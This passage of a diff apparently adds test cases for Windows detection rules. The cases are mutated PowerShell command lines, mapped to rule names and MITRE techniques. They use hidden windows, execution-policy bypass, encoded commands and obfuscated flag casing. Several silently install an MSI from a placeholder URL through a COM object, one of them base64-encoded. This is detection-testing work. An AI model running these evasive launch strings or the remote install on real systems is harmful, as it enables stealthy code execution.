+    "target_commandline": "powershell.exe -\"NoProfile\" /\"NonInteractive\" -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass -\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_067",
+    "target_commandline": "powershell.exe -nop -NoNiNTeRActIVe -\"WindowStyle\" Hidden -EXECUtionpOLIcY Bypass -\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_068",
+    "target_commandline": "powershell.exe -\"NoProfile\" -nOniNteRacTivE -\"WindowStyle\" Hidden -EXECuTIONpOlIcy Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_069",
+    "target_commandline": "powershell.exe -nop -\"NonInteractive\" -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass /\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_070",
+    "target_commandline": "powershell.exe /\"NoProfile\" /\"NonInteractive\" -WINDOWsTYLE Hidden /\"ExecutionPolicy\" Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_071",
+    "target_commandline": "powershell.exe -noProFiLe -exEcUtiOnpOLicy Bypass -WInDowStyLe Hidden /\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_072",
+    "target_commandline": "powershell.exe -nOPRofiLe -ExeCuTionpOlicy Bypass -winDoWSTYle Hidden -\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_073",
+    "target_commandline": "powershell.exe -NOpRoFIle /\"ExecutionPolicy\" Bypass /\"WindowStyle\" Hidden /\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_074",
+    "target_commandline": "powershell.exe -NOproFile -EXEcuTiOnpOLiCY Bypass -\"WindowStyle\" Hidden -EnCOdEdcomMaNd UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_075",
+    "target_commandline": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_076",
+    "target_commandline": "powershell.exe -ep Bypass /\"NoProfile\" -wINdoWStyLE Hidden -enCODEDCOMmaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1059.001_077",
     "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass /\"NoProfile\" -ws Hidden -\"EncodedCommand\" <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
@@ -3560,8 +4168,24 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.001_079",
+    "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass -nop -WiNdoWsTYLe Hidden -EncOdedcommanD <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1059.001_080",
     "target_commandline": "powershell.exe -EXECUTIonPOliCY Bypass -NOPrOFiLe -ws Hidden -enCOdEDcOmmaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_081",
+    "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass -noPRoFile /\"WindowStyle\" Hidden -enc <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -3576,8 +4200,24 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.001_083",
+    "target_commandline": "powershell.exe -\"ExecutionPolicy\" Bypass -NoProfILe -windOWstYLe Hidden -EncODEdCOMmANd <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1059.001_084",
     "target_commandline": "powershell.exe -ep Bypass -nop -ws Hidden -eNcoDEDcommaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_085",
+    "target_commandline": "powershell.exe -exECUtIOnPOlicY Bypass -nop /\"WindowStyle\" Hidden -\"EncodedCommand\" <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -3667,6 +4307,46 @@
     "test_id": "t1059.001_096",
     "target_commandline": "powershell.exe -\"Command\" \"[char[]](https://www.google.com/search?q=106,111,105,110) -join ''\"",
     "target_rule": "proc_creation_win_hktl_crackmapexec_powershell_obfuscation",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_097",
+    "target_commandline": "powershell.exe -sta -nop -NonInteractive -wINdoWstyLE Hidden -\"EncodedCommand\" JAB0AGUAcwB0AD0AMQA=",
+    "target_rule": "proc_creation_win_hktl_empire_powershell_launch",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_098",
+    "target_commandline": "powershell.exe /\"sta\" /\"NoProfile\" -\"NonInteractive\" /\"WindowStyle\" Hidden -ENcoDeDCOmmANd JAB0AGUAcwB0AD0AMQA=",
+    "target_rule": "proc_creation_win_hktl_empire_powershell_launch",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_099",
+    "target_commandline": "powershell.exe -sta -nop -\"NonInteractive\" /\"WindowStyle\" Hidden -eNcoDEdCoMMAND JAB0AGUAcwB0AD0AMQA=",
+    "target_rule": "proc_creation_win_hktl_empire_powershell_launch",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_100",
+    "target_commandline": "powershell.exe -sta -NOProFilE /\"NonInteractive\" -\"WindowStyle\" Hidden -\"EncodedCommand\" JAB0AGUAcwB0AD0AMQA=",
+    "target_rule": "proc_creation_win_hktl_empire_powershell_launch",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_101",
+    "target_commandline": "powershell.exe -sTA -nop -NonInteractive -\"WindowStyle\" Hidden -eNCODEdCOmMAnd JAB0AGUAcwB0AD0AMQA=",
+    "target_rule": "proc_creation_win_hktl_empire_powershell_launch",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
@@ -4035,6 +4715,38 @@
     "test_id": "t1059.001_147",
     "target_commandline": "powershell.exe /\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\"",
     "target_rule": "proc_creation_win_powershell_base64_frombase64string",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_148",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"EncodedCommand\" QgBpAFQAcwBBAGQATQBpAE4AIAAvAHQAcgBhAG4AcwBmAGUAcg==",
+    "target_rule": "proc_creation_win_powershell_base64_hidden_flag",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_149",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden /\"EncodedCommand\" QgBpAFQAcwBBAGQATQBpAE4AIAAvAHQAcgBhAG4AcwBmAGUAcg==",
+    "target_rule": "proc_creation_win_powershell_base64_hidden_flag",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_150",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden -enc QgBpAFQAcwBBAGQATQBpAE4AIAAvAHQAcgBhAG4AcwBmAGUAcg==",
+    "target_rule": "proc_creation_win_powershell_base64_hidden_flag",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_151",
+    "target_commandline": "powershell.exe -wIndowsTyLe Hidden /\"EncodedCommand\" QgBpAFQAcwBBAGQATQBpAE4AIAAvAHQAcgBhAG4AcwBmAGUAcg==",
+    "target_rule": "proc_creation_win_powershell_base64_hidden_flag",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
@@ -4754,6 +5466,54 @@
   {
     "test_id": "t1059.001_241",
     "target_commandline": "powershell.exe -\"EncodedCommand\" JAB1AD0AJwBoAHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvACcAOwAkAGkAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAoACcAaQBuAGQAbwB3AHMASQBuAHMAdABhAGwAbABlAHIALgBJAG4AcwB0AGEAbABsAGUAcgAnAC4ASQBuAHMAZQByAHQAKAAwACwAJwBXACcAKQApADsAJABpAC4AVQBJAEwAZQB2AGUAbAA9ADIAOwAkAGkALgBJAG4AcwB0AGEAbABsAFAAcgBvAGQAdQBjAHQAKAAkACgAaQBmACgAJAB1AC4AUwB0AGEAcgB0AHMAVwBpAHQAaAAoACcAaAB0AHAAcwA6AC8ALwAnACkAKQB7ACQAdQAuAEkAbgBzAGUAcgB0ACgAMgAsACcAdAAnACkAfQBlAGwAcwBlAHsAJAB1AH0AKQAsACcAJwApADsA",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_242",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -COMmanD \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_243",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -c \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_244",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_245",
+    "target_commandline": "powershell.exe -wiNDowStyLe Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_246",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_247",
+    "target_commandline": "powershell.exe -WiNDOwSTYlE Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
     "target_rule": "proc_creation_win_powershell_comobject_msi",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6040,6 +6800,30 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.001_408",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"ExecutionPolicy\" Bypass -comMAND \"Write-Host 'Testing Rule Scope'\"",
+    "target_rule": "proc_creation_win_powershell_susp_parameter_variation",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_409",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass -c \"Write-Host 'Testing Rule Scope'\"",
+    "target_rule": "proc_creation_win_powershell_susp_parameter_variation",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_410",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden -EXecutIonPoLIcy Bypass /\"Command\" \"Write-Host 'Testing Rule Scope'\"",
+    "target_rule": "proc_creation_win_powershell_susp_parameter_variation",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1059.001_411",
     "target_commandline": "C:\\WINDOWS\\system32\\cmd.exe /c \"powershell.exe\" -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt",
     "target_rule": "proc_creation_win_powershell_susp_parent_process",
@@ -6232,6 +7016,38 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.001_435",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -\"WindowStyle\" Hidden -Ep Bypass -\"noni\" /\"Command\" \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_436",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WiNdoWstYle Hidden -EP Bypass -\"noni\" -COmmand \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_437",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -winDOWstYlE Hidden -ExecutionPolicy Bypass /\"noni\" -c \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_438",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WinDOwStYLe Hidden -\"ep\" Bypass -noni -c \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1059.001_439",
     "target_commandline": "powershell.exe -\"w\" hidden -nop",
     "target_rule": "proc_creation_win_schtasks_powershell_persistence",
@@ -6266,6 +7082,22 @@
   {
     "test_id": "t1059.001_443",
     "target_commandline": "powershell.exe -\"w\" hidden -nOprOfiLe",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_444",
+    "target_commandline": "powershell.exe /\"windowstyle\" hidden",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_445",
+    "target_commandline": "powershell.exe -\"windowstyle\" hidden",
     "target_rule": "proc_creation_win_schtasks_powershell_persistence",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6872,6 +7704,110 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.003_046",
+    "target_commandline": "powershell.exe -\"NoProfile\" -NonInteractive -WinDOwsTYle Hidden -ep Bypass /\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_047",
+    "target_commandline": "powershell.exe -nop /\"NonInteractive\" -\"WindowStyle\" Hidden /\"ExecutionPolicy\" Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_048",
+    "target_commandline": "powershell.exe -\"NoProfile\" /\"NonInteractive\" -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass -\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_049",
+    "target_commandline": "powershell.exe -nop -NoNiNTeRActIVe -\"WindowStyle\" Hidden -EXECUtionpOLIcY Bypass -\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_050",
+    "target_commandline": "powershell.exe -\"NoProfile\" -nOniNteRacTivE -\"WindowStyle\" Hidden -EXECuTIONpOlIcy Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_051",
+    "target_commandline": "powershell.exe -nop -\"NonInteractive\" -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass /\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_052",
+    "target_commandline": "powershell.exe /\"NoProfile\" /\"NonInteractive\" -WINDOWsTYLE Hidden /\"ExecutionPolicy\" Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_053",
+    "target_commandline": "powershell.exe -noProFiLe -exEcUtiOnpOLicy Bypass -WInDowStyLe Hidden /\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_054",
+    "target_commandline": "powershell.exe -nOPRofiLe -ExeCuTionpOlicy Bypass -winDoWSTYle Hidden -\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_055",
+    "target_commandline": "powershell.exe -NOpRoFIle /\"ExecutionPolicy\" Bypass /\"WindowStyle\" Hidden /\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_056",
+    "target_commandline": "powershell.exe -NOproFile -EXEcuTiOnpOLiCY Bypass -\"WindowStyle\" Hidden -EnCOdEdcomMaNd UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_057",
+    "target_commandline": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_058",
+    "target_commandline": "powershell.exe -ep Bypass /\"NoProfile\" -wINdoWStyLE Hidden -enCODEDCOMmaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1059.003_059",
     "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass /\"NoProfile\" -ws Hidden -\"EncodedCommand\" <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
@@ -6888,8 +7824,24 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.003_061",
+    "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass -nop -WiNdoWsTYLe Hidden -EncOdedcommanD <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1059.003_062",
     "target_commandline": "powershell.exe -EXECUTIonPOliCY Bypass -NOPrOFiLe -ws Hidden -enCOdEDcOmmaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_063",
+    "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass -noPRoFile /\"WindowStyle\" Hidden -enc <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -6904,8 +7856,24 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.003_065",
+    "target_commandline": "powershell.exe -\"ExecutionPolicy\" Bypass -NoProfILe -windOWstYLe Hidden -EncODEdCOMmANd <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1059.003_066",
     "target_commandline": "powershell.exe -ep Bypass -nop -ws Hidden -eNcoDEDcommaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.003_067",
+    "target_commandline": "powershell.exe -exECUtIOnPOlicY Bypass -nop /\"WindowStyle\" Hidden -\"EncodedCommand\" <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -6962,6 +7930,54 @@
   {
     "test_id": "t1564.003_004",
     "target_commandline": "cmd.exe /c \"C:\\Windows\\TEMP\\HiddenPath\\23.6.8.8644\\3c41d689-bbf5-4216-b2f4-ba8fd6192c25run.cmd\"",
+    "target_rule": "proc_creation_win_remote_access_tools_screenconnect_remote_execution",
+    "technique_id": "t1564.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1564.003_005",
+    "target_commandline": "powershell.exe -\"ExecutionPolicy\" Bypass -wIndOWSTyle Hidden -\"File\" C:\\Windows\\TEMP\\ScreenConnect\\23.6.8.8644\\tool.ps1",
+    "target_rule": "proc_creation_win_remote_access_tools_screenconnect_remote_execution",
+    "technique_id": "t1564.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1564.003_006",
+    "target_commandline": "powershell.exe -ep Bypass /\"WindowStyle\" Hidden -file C:\\Windows\\TEMP\\ScreenConnect\\23.6.8.8644\\tool.ps1",
+    "target_rule": "proc_creation_win_remote_access_tools_screenconnect_remote_execution",
+    "technique_id": "t1564.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1564.003_007",
+    "target_commandline": "powershell.exe -\"ExecutionPolicy\" Bypass -WIndOwstYLE Hidden -\"File\" C:\\Windows\\TEMP\\ScreenConnect\\23.6.8.8644\\tool.ps1",
+    "target_rule": "proc_creation_win_remote_access_tools_screenconnect_remote_execution",
+    "technique_id": "t1564.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1564.003_008",
+    "target_commandline": "powershell.exe -ep Bypass -WiNdoWSTylE Hidden /\"File\" C:\\Windows\\TEMP\\ScreenConnect\\23.6.8.8644\\tool.ps1",
+    "target_rule": "proc_creation_win_remote_access_tools_screenconnect_remote_execution",
+    "technique_id": "t1564.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1564.003_009",
+    "target_commandline": "powershell.exe -ep Bypass /\"WindowStyle\" Hidden -\"File\" C:\\Windows\\TEMP\\ScreenConnect\\23.6.8.8644\\tool.ps1",
+    "target_rule": "proc_creation_win_remote_access_tools_screenconnect_remote_execution",
+    "technique_id": "t1564.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1564.003_010",
+    "target_commandline": "powershell.exe -exEcuTIonPoLICY Bypass -wiNdowsTyLe Hidden /\"File\" C:\\Windows\\TEMP\\ScreenConnect\\23.6.8.8644\\tool.ps1",
     "target_rule": "proc_creation_win_remote_access_tools_screenconnect_remote_execution",
     "technique_id": "t1564.003",
     "shell": "cmd.exe",
@@ -10304,6 +11320,54 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1218.007_008",
